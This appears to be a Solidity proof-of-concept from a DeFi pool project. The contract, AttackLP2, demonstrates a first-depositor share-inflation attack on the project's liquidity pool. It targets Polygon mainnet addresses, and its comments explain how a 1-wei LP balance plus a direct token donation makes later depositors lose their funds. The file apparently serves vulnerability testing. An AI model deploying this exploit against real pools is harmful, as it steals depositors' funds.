
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import "../interfaces/IPoolV4.sol";
import "../PoolLPToken.sol";

import "hardhat/console.sol";


interface IDaoTokenFarm {
    function getStakedBalance(address account, address lpToken) external view returns (uint);
}

interface WETH {
    function approve(address guy, uint wad) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
    function deposit() external payable;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

}

interface IPool {
    function totalValue() external view returns(uint);
    function riskAssetValue() external view returns(uint);
    function stableAssetValue() external view returns(uint);
    
    function deposit(uint amount) external;
    function withdrawLP(uint amount) external;
}



contract AttackLP2 is Ownable {

    

    address constant usdc_address = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
    address constant weth_address = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
    address constant wbtc_address = 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6;

    address constant hst_farm_address = 0xF3515ED3E4a93185ea16D11A870Cf6Aa65a41Ec7;


    IPool public pool;
    IERC20Metadata public lpToken;
    IERC20Metadata public depositToken;
    IERC20Metadata public investToken;



    fallback() external payable {}
    receive() external payable {}


    WETH public constant WETH9 = WETH(weth_address); // Polygon WETH
    ISwapRouter public constant swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // Polygon Uniswap V3
 

   constructor(
        address _poolAddress,
        address _poolLpAddress,
        address _depositTokenAddress,
        address _investTokenAddress
    ) payable {
        // require(msg.value >= 50 ether, "Need eth to buy underlying");

        pool = IPool(_poolAddress);
        lpToken = IERC20Metadata(_poolLpAddress);
        depositToken = IERC20Metadata(_depositTokenAddress);
        investToken = IERC20Metadata(_investTokenAddress);
    }




    function deposit (uint deposit1) external {

        // init();
        require(
            lpToken.totalSupply() == 0,
            "attack only possible when totalSupply of liquidityToken zero"
        );

        require (depositToken.allowance(msg.sender,  address(this)) >= deposit1, "Unsufficient allowance!");
        depositToken.transferFrom(address(msg.sender), address(this), deposit1);
      

        depositToken.approve((address(pool)), deposit1);
        pool.deposit(deposit1);
        console.log("A: >> Deposited USDC: ", deposit1, "balance: ", depositToken.balanceOf(address(this)));

        console.log("A: >> pool USDC: ", depositToken.balanceOf(address(pool)));
        console.log("A: >> pool WBTC: ", investToken.balanceOf(address(pool)));
    }


    function withdraw() external {


        uint256 liquidityTokenBalance = lpToken.balanceOf(address(this));
        //now redeem all the USDC
        uint256 liquidityTokenToRedeem = liquidityTokenBalance - 1 ;
        pool.withdrawLP(liquidityTokenToRedeem);

        liquidityTokenBalance = lpToken.balanceOf(address(this));
        assert(liquidityTokenBalance == 1); //as expected

        console.log("B: >> Withdrawn LP: ", liquidityTokenToRedeem, "balance: ", depositToken.balanceOf(address(this)));
        console.log("B: >> pool USDC: ", depositToken.balanceOf(address(pool)));
        console.log("B: >> pool WBTC: ", investToken.balanceOf(address(pool)));

        //now transfer X baseAsset directly to liquidity contract addres
        //this make 1 wei of Liquidity token  worth ~X baseToken tokens
        //Attacker can make this X as big as they want as they can redeem it with 1 wei
       
        // depositToken.transfer(address(pool), X);

    }


    //call afet the attack function 
    function userDeposit() external {
        //some one tries to mint less than Y
        uint256 liquidityTokenBalanceBefore = lpToken.balanceOf(address(address(this)));// balance befefore deposit
        uint256 Y = 1000e18;
        depositToken.approve(address(pool), Y);
        pool.deposit(Y);
        //here they do not get 0 liquidityToken
        //and they loose all of their undelrying tokens
        require(
            liquidityTokenBalanceBefore == lpToken.balanceOf(address(address(this))), // check balance after the deposit and both are same
            "attack was not sucessfull"
        );
    }


   //swap some ETH for baseAsset token
   function init() internal {
     
        uint256 amountIn = 10 ether;

        (bool success, ) = address(WETH9).call{value: 10 ether}("");
        assert(success);
        
        WETH9.approve(address(swapRouter), amountIn);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
        .ExactInputSingleParams({
            tokenIn: weth_address,
            tokenOut: usdc_address,
            // pool fee 0.3%
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uint amountOut = swapRouter.exactInputSingle(params);
        console.log(amountOut/1 ether);

    }


}